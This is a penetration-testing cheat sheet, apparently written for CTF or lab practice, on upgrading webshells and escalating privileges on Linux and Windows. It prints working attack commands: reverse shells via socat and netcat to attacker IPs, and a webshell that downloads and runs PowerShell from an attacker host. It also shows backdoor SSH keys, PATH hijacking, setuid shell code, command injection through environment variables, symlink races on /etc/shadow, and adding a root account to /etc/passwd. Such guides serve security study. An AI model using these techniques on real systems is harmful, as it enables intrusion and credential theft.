### Sneaky Stealthy SU in (Web) Shells

Let’s say we have a webshell on the server (probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.

**Example**

Webshell like

    http://IP/shell.php?cmd=id

If we try

    echo password | su -c whoami

Probably will get

    standard in must be a tty

The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell

    (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
    root

The above has been referenced from SANS <a href="https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#" class="reference external">Sneaky Stealthy SU in (Web) Shells</a>

## Spawning a Fully Interactive TTYs Shell

<a href="https://twitter.com/ropnop" class="reference external">Ronnie Flathers</a> has already written a great blog on <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" class="reference external">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog post and kept here for completion.

Many times, we will not get a fully interactive shell therefore it will/ have:

-   Difficult to use the text editors like vim
-   No tab-complete
-   No up arrow history
-   No job control

### Socat

Socat can be used to pass full TTY’s over TCP connections.

On Kali-Machine (Attackers - Probably yours)

    socat file:`tty`,raw,echo=0 tcp-listen:4444

On Victim (launch):

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

If socat isn’t installed, download standalone binaries that can be downloaded from <a href="https://github.com/andrew-d/static-binaries" class="reference external">static binaries</a>

Download the correct binary architecture of socat to a writable directory, chmod it, execute

### stty

Use the methods mentioned in

Once bash is running in the PTY, background the shell with Ctrl-Z While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it

    echo $TERM
    xterm-256color

    stty -a
    speed 38400 baud; rows 59; columns 264; line = 0;
    intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;
    -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
    -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
    opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
    isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)

With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:

    stty raw -echo

With a raw stty, input/ output will look weird and you won’t see the next commands, but as you type they are being processed.

Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.

After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)

    $ export SHELL=bash
    $ export TERM=xterm256-color
    $ stty rows 38 columns 116

The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection

### ssh-key

If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen

    ssh-keygen
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa):
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in /home/bitvijays/.ssh/id_rsa.
    Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.
    The key fingerprint is:
    SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home
    The key's randomart image is:
    +---[RSA 2048]----+
    |o==*+. +=.       |
    |=o**+ o. .       |
    |=+...+  o +      |
    |=.* .    * .     |
    |oO      S .     .|
    |+        o     E.|
    |..      +       .|
    | ..    . . . o . |
    |  ..      ooo o  |
    +----[SHA256]-----+

Copy/ Append the public part to /home/user/.ssh/authorized\_keys

    cat /home/bitvijays/.ssh/id_rsa.pub

    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys

Now, ssh to the box using that user.

    ssh user@hostname -i id_rsa

## Restricted Shell

Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from <a href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells" class="reference external">Escaping Restricted Linux Shells</a>, <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells" class="reference external">Escape from SHELLcatraz</a>

### Definition

It limits a user’s ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:

-   Using the ‘cd’ command to change directories.
-   Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc…).
-   Specifying command names that contain slashes.
-   Specifying a filename containing a slash as an argument to the ‘.’ built-in command.
-   Specifying a filename containing a slash as an argument to the ‘-p’ option to the ‘hash’ built-in command.
-   Importing function definitions from the shell environment at startup.
-   Parsing the value of SHELLOPTS from the shell environment at startup.
-   Redirecting output using the ‘\>’, ‘\>\|’, “, ‘\>&’, ‘&\>’, and ‘\>\>’ redirection operators.
-   Using the ‘exec’ built-in to replace the shell with another command.
-   Adding or deleting built-in commands with the ‘-f’ and ‘-d’ options to the enable built-in.
-   Using the ‘enable’ built-in command to enable disabled shell built-ins.
-   Specifying the ‘-p’ option to the ‘command’ built-in.
-   Turning off restricted mode with ‘set +r’ or ‘set +o restricted

Real shell implements restricted shells:

-   rbash

        bash -r
        cd
        bash: cd: restricted

-   rsh

-   rksh

**Getting out of restricted shell**

### Reconnaissance

Find out information about the environment.

-   Run env to see exported environment variables
-   Run ‘export -p’ to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are ‘-rx’, which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!

> -   If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc…).
> -   If the PATH is writeable, then you’ll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.

-   Try basic Unix commands and see what’s allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.

### Quick Wins

-   If ‘/’ is allowed in commands just run /bin/sh

-   If we can set PATH or SHELL variable

        export PATH=/bin:/usr/bin:/sbin:$PATH
        export SHELL=/bin/sh

    or if chsh command is present just change the shell to /bin/bash

        chsh
        password: <password will be asked>
        /bin/bash

-   If we can copy files into existing PATH, copy

     cp /bin/sh /current/directory; sh

### Taking help of binaries

Some commands let us execute other system commands, often bypassing shell restrictions

-   ftp -\> !/bin/sh
-   gdb -\> !/bin/sh
-   more/ less/ man -\> !/bin/sh
-   vi -\> :!/bin/sh : Refer <a href="http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html" class="reference external">Breaking out of Jail : Restricted Shell</a> and <a href="http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html" class="reference external">Restricted Accounts and Vim Tricks in Linux and Unix</a>
-   scp -S /tmp/getMeOut.sh x y : Refer <a href="http://pentestmonkey.net/blog/rbash-scp" class="reference external">Breaking out of rbash using scp</a>
-   awk ‘BEGIN {system(“/bin/sh”)}’
-   find / -name someName -exec /bin/sh ;
-   tee

     echo "Your evil code" | tee script.sh

-   Invoke shell thru scripting language

> -   Python
>
> >     python -c 'import os; os.system("/bin/bash")
>
> -   Perl
>
> >     perl -e 'exec "/bin/sh";'

### SSHing from outside

-   Use SSH on your machine to execute commands before the remote shell is loaded:

>     ssh username@IP -t "/bin/sh"

-   Start the remote shell without loading “rc” profile (where most of the limitations are often configured)

>     ssh username@IP -t "bash --noprofile"
>
>     -t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty

### Getting out of rvim

Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from <a href="https://ctftime.org/writeup/5784" class="reference external">vimjail</a>

-   To list all installed features it is possible to use ‘:version’ vim command.

>     :version
>     VIM - Vi IMproved 8.0 (2016 Sep 12, compiled Nov 04 2017 04:17:46)
>     Included patches: 1-1257
>     Modified by pkg-vim-maintainers@lists.alioth.debian.org
>     Compiled by pkg-vim-maintainers@lists.alioth.debian.org
>     Huge version with GTK2 GUI.  Features included (+) or not (-):
>     +acl             +cindent         +cryptv          -ebcdic          +float           +job             +listcmds        +mouse_dec       +multi_byte      +persistent_undo  +rightleft       +syntax          +termresponse    +visual          +X11
>     +arabic          +clientserver    +cscope          +emacs_tags      +folding         +jumplist        +localmap        +mouse_gpm       +multi_lang      +postscript       +ruby            +tag_binary      +textobjects     +visualextra     -xfontset
>     +autocmd         +clipboard       +cursorbind      +eval            -footer          +keymap          +lua             -mouse_jsbterm   -mzscheme        +printer          +scrollbind      +tag_old_static  +timers          +viminfo         +xim
>     +balloon_eval    +cmdline_compl   +cursorshape     +ex_extra        +fork()          +lambda          +menu            +mouse_netterm   +netbeans_intg   +profile          +signs           -tag_any_white   +title           +vreplace        +xpm
>     +browse          +cmdline_hist    +dialog_con_gui  +extra_search    +gettext         +langmap         +mksession       +mouse_sgr       +num64           -python           +smartindent     +tcl             +toolbar         +wildignore      +xsmp_interact
>     ++builtin_terms  +cmdline_info    +diff            +farsi           -hangul_input    +libcall         +modify_fname    -mouse_sysmouse  +packages        +python3          +startuptime     +termguicolors   +user_commands   +wildmenu        +xterm_clipboard
>     +byte_offset     +comments        +digraphs        +file_in_path    +iconv           +linebreak       +mouse           +mouse_urxvt     +path_extra      +quickfix         +statusline      +terminal        +vertsplit       +windows         -xterm_save
>     +channel         +conceal         +dnd             +find_in_path    +insert_expand   +lispindent      +mouseshape      +mouse_xterm     +perl            +reltime         - sun_workshop    +terminfo        +virtualedit     +writebackup
>       system vimrc file: "$VIM/vimrc"

-   Examining installed features and figure out which interpreter is installed.
-   If python/ python3 has been installed

>     :python3 import pty;pty.spawn("/bin/bash")

## Gather information from files

In case of LFI or unprivileged shell, gathering information could be very useful. Mostly taken from <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" class="reference external">g0tmi1k Linux Privilege Escalation Blog</a>

### Operating System

```
    cat /etc/issue
    cat /etc/*-release
    cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based
```

### /Proc Variables

    /proc/sched_debug      This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.
    /proc/mounts           Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located
    /proc/net/arp          Shows the ARP table.  This is one way to find out IP addresses for other internal servers.
    /proc/net/route        Shows the routing table information.
    /proc/net/tcp
    /proc/net/udp          Provides a list of active connections.  Can be used to determine what ports are listening on the server
    /proc/net/fib_trie     This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure
    /proc/version          Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.

Each process also has its own set of attributes. If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run. Sometimes these include passwords. Linux also has a special proc directory called self which can be used to query information about the current process without having to know it’s PID.

    /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
    /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
    /proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
    /proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.

The information about Proc variables has been taken from <a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" class="reference external">Directory Traversal, File Inclusion, and The Proc File System</a>

### Environment Variables

    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout

### Configuration Files

-   Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?

>     /etc/apache2/apache2.conf
>     /etc/apache2/sites-enabled/000-default

### User History

    ~/.bash_history
    ~/.nano_history
    ~/.atftp_history
    ~/.mysql_history
    ~/.php_history
    ~/.viminfo

### Private SSH Keys / SSH Configuration

    ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
    ~/.ssh/identity.pub
    ~/.ssh/identity
    ~/.ssh/id_rsa.pub
    ~/.ssh/id_rsa
    ~/.ssh/id_dsa.pub
    ~/.ssh/id_dsa
    /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
    /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file



# Unprivileged Shell to Privileged Shell

Probably, at this point of time, we would have unprivileged shell of user www-data. If you are on Windows, there are particular set of steps. If you are on linux, it would be a good idea to first check privilege escalation techniques from g0tm1lk blog such as if there are any binary executable with SUID bits, if there are any cron jobs running with root permissions.

\[Linux\] If you have become a normal user of which you have a password, it would be a good idea to check sudo -l (for every user! Yes, even for www-data) to check if there are any executables you have permission to run.

## Windows Privilege Escalation

If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize

### SystemInfo

Run system info and findout

-   Operating System Version
-   Architecture : Whether x86 or x64.
-   Hotfix installed

The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.

    systeminfo

    Host Name:                 VICTIM-MACHINE
    OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
    OS Version:                6.1.7600 N/A Build 7600
    OS Manufacturer:           Microsoft Corporation
    OS Configuration:          Standalone Server
    OS Build Type:             Multiprocessor Free
    Registered Owner:          Windows User
    Registered Organization:
    Product ID:                00496-001-0001283-84782
    Original Install Date:     18/3/2017, 7:04:46 ��
    System Boot Time:          7/11/2017, 3:13:00 ��
    System Manufacturer:       VMware, Inc.
    System Model:              VMware Virtual Platform
    System Type:               x64-based PC
    Processor(s):              2 Processor(s) Installed.
                               [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
                               [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
    BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             el;Greek
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
    Total Physical Memory:     2.048 MB
    Available Physical Memory: 1.640 MB
    Virtual Memory: Max Size:  4.095 MB
    Virtual Memory: Available: 3.665 MB
    Virtual Memory: In Use:    430 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    HTB
    Logon Server:              N/A
    Hotfix(s):                 N/A
    Network Card(s):           1 NIC(s) Installed.
                               [01]: Intel(R) PRO/1000 MT Network Connection
                                     Connection Name: Local Area Connection
                                     DHCP Enabled:    No
                                     IP address(es)
                                     [01]: 10.54.98.9

If there are no Hotfixes installed, we can visit

    C:\Windows\SoftwareDistribution\Download

This directory is the temporary location for WSUS. Updates were downloaded here, doesn’t mean were installed. Otherwise, we may visit

    C:\Windows\WindowUpdate.log

which will inform if any hotfixes are installed.

### Metasploit Local Exploit Suggestor

Metasploit local\_exploit\_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.

> Note
>
> It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.

### Sherlock and PowerUp Powershell Script

-   <a href="https://github.com/rasta-mouse/Sherlock" class="reference external">Sherlock</a> PowerShell script by <a href="https://twitter.com/_RastaMouse" class="reference external">rastamouse</a> to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local\_exploit\_suggester didn’t resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
-   <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" class="reference external">PowerUp</a> : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

The above can be executed by

    view-source:10.54.98.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -

> We execute powershell with noprofile and accept the input from stdin

### Windows Exploit Suggestor

<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" class="reference external">Windows Exploit Suggestor</a> : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. Just copy the systeminfo information from the windows OS and compare the database.

If we are getting the below error on running local exploits of getuid in meterpreter

    [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.

Possibly, migrate into a new process using post/windows/manage/migrate

### Windows Kernel Exploits

<a href="https://github.com/SecWiki/windows-kernel-exploits" class="reference external">Windows Kernel Exploits</a> contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket

    usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath

    This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment 'My share' TMP /tmp

    positional arguments:
      shareName         name of the share to add
      sharePath         path of the share to add

Assuming, the current directory contains our compiled exploit, we can

    impacket-smbserver <sharename> `pwd`
    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed

Once, smbserver is up and running, we can execute code like

    view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami

Considering shell.php is our php oneliner to execute commands.

### Abusing Token Privileges

If we have the windows shell or meterpreter, we can type “whoami /priv” or if we have meterpreter, we can type “getprivs”

If we have any of the below privileges, we can possibly utilize <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" class="reference external">Rotten Potato</a>

    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

The above was for the Windows OS and the below is for Linux OS.

## Linux Privilege Escalation

[] Checklist

Techniques for Linux privilege escalation:

Once, we have got the unprivileged shell, it is very important to check the below things

-   Did you try “sudo -l” and check if we have any binaries which can be executed as root?
-   Are there any binaries with Sticky, suid, guid.
-   Are there any world-writable folders, files.
-   Are there any world-execuable files.
-   Which are the files owned by nobody (No user)
-   Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that’s not always the case.)
-   What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
-   What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).
-   What are the services running? (netstat -antup)
-   Check the entries in the crontab!
-   What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.
-   What groups does the user belong to (adm, audio, video, disk)?
-   What other users are logged on the linux box (command w)?

### What “Advanced Linux File Permissions” are used?

Sticky bits, SUID & GUID

- Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.

```
find / -perm -1000 -type d 2>/dev/null
```

- SGID (chmod 2000) - run as the group, not the user

```
find / -perm -g=s -type f 2>/dev/null
```

- SUID (chmod 4000) - run as the owner, not the user who started it.

        find / -perm -u=s -type f 2>/dev/null

- SGID or SUID

```
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

-  Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin, for SGID or SUID (Quicker search)

```
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
```

- find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)

```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

### Where can written to and executed from?

A few ‘common’ places: /tmp, /var/tmp, /dev/shm

    find / -writable -type d 2>/dev/null      # world-writeable folders
    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    find / -perm -o+w -type d 2>/dev/null     # world-writeable folders
    find / -perm -o+w -type f 2>/dev/null     # world-writeable files
    find / -type f -perm -o+w -not -type l -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null # world-writeable files

    find / -perm -o+x -type d 2>/dev/null     # world-executable folders
    find / -perm -o+x -type f 2>/dev/null     # world-executable files

    find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders

### Any “problem” files?

Word-writeable, “nobody” files

    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
    find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

### Find files/ folder owned by the user

After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.

    find / -user username 2> /dev/null
    find / -group groupname 2> /dev/null

Tip

Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.

## Other Linux Privilege Escalation

### Execution of binary from Relative location than Absolute

If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a href="mailto:ron%40ton.home" class="reference external">ron<span>@</span>ton<span>.</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.

Something like this:

    system("/usr/bin/env echo and now what?");

so we can create a file in temp:

    echo "/bin/sh" >> /tmp/id
    chmod +x /tmp/id

    www-data@yummy:/tmp$ echo "/bin/sh" >> /tmp/id
    www-data@yummy:/tmp$ export PATH=/tmp:$PATH
    www-data@yummy:/tmp$ which id
    /tmp/id
    www-data@yummy:/tmp$ /opt/backjob
    whoami
    root
    # /usr/bin/id
    uid=0(root) gid=0(root) groups=0(root),33(www-data)

By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is:

-   /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”
-   Linux searches the filesystem according to its path (here: in /tmp first)
-   Our malicious /tmp/scp or /tmp/id gets found and executed as root
-   A new bash opens with root privileges.

If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it’s something like:

    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

It is important to see .bash\_profile file which contains the $PATH

### Environment Variable Abuse

If the suid binary contains a code like

    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
    printf("about to call system(\"%s\")\n", buffer);
    system(buffer);

We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to

    USER=";/bin/sh;"

When the program is executed, USER variable will contain /bin/sh and will be executed on system call.

    echo $USER
    ;/bin/sh;

    levelXX@:/home/flagXX$ ./flagXX
    about to call system("/bin/echo ;/bin/sh; is cool")

    sh-4.2$ id
    uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)

### World-Writable Folder with a Script executing any file in that folder using crontab

If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as

    #!/bin/sh

    for i in /home/flagXX/writable.d/* ; do
           (ulimit -t 5; bash -x "$i")
           rm -f "$i"
    done

then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like

    echo "/bin/nc.traditional -e /bin/sh 192.168.56.1 22" > hello.sh

or

we can create a suid file to give us the privileged user permission

    #!/bin/sh
    gcc /var/tmp/shell.c -o /var/tmp/flagXX
    chmod 4777 /var/tmp/flagXX

Considering shell.c contains

    int main(void) {
    setgid(0); setuid(0);
    execl("/bin/sh","sh",0); }

### Symlink Creation

Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let’s say there’s a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do

    ln -s /etc/shadow /home/xxxxxx/example.conf
    ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf

Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink

    readExampleConf /home/xxxxxxx/example.conf
    <Contents of shadow or id_rsa>

### Directory Symlink

Let’s see what happens when we create a symlink of a directory

    ln -s /etc/ sym_file
    ln -s /etc/ sym_fold/

Here the first one create a direct symlink to the /etc folder and will be shown as

    sym_file -> /etc/

where as in the second one ( ln -s /etc/ sym\_fold/ ), we first create a folder sym\_fold and then create a symlink

    sym_fold:
    total 0
    lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -> /etc/

This might be useful to bypass some filtering, when let’s say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup.

### Time of check to time of use

In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:

    if (access("file", W_OK) != 0) {
      exit(1);
    }

    fd = open("file", O_WRONLY);
    //read over /etc/shadow
    read(fd, buffer, sizeof(buffer));

Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:

Attacker

    //
    //
    // After the access check
    symlink("/etc/shadow", "file");
    // Before the open, "file" points to the password database
    //
    //

In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.

Let’s see how we can exploit this?

In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don’t have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.

    while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flagXX/token /tmp/token ; done

We would also run the program in a while loop

    while true; do ./flagXX /tmp/token 192.168.56.1 ; done

Learning:

Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.

### Writable /etc/passwd or account credentials came from a legacy unix system

-   Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.
-   For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.
-   Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.
-   If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example

>      Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]
>      Crypts the PASSWORD using crypt(3).
>
>         -m, --method=TYPE     select method TYPE
>         -5                    like --method=md5
>         -S, --salt=SALT       use the specified SALT
>         -R, --rounds=NUMBER   use the specified NUMBER of rounds
>         -P, --password-fd=NUM read the password from file descriptor NUM
>                               instead of /dev/tty
>         -s, --stdin           like --password-fd=0
>         -h, --help            display this help and exit
>         -V, --version         output version information and exit
>
>     mkpasswd can generate DES, MD5, SHA-256, SHA-512

-   It’s possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That’s because it’s possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0

### Elevating privilege from a suid binary

If we have ability to create a suid binary, we can use either

Suid.c

    int main(void) {
    setgid(0); setuid(0);
    execl(“/bin/sh”,”sh”,0); }

or

    int main(void) {
    setgid(0); setuid(0);
    system("/bin/bash -p"); }

However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.

More details can be found at <a href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html" class="reference external">Common Pitfalls When Writing Exploits</a>

### Executing Python script with sudo

If there exists a python script which has a import statement and a user has a permission to execute it using sudo.

    <display_script.py>

    #!/usr/bin/python3
    import ftplib or import example
    <Python code utilizing ftplib or example calling some function>
    print (example.display())

and is executed using

    sudo python display_script.py

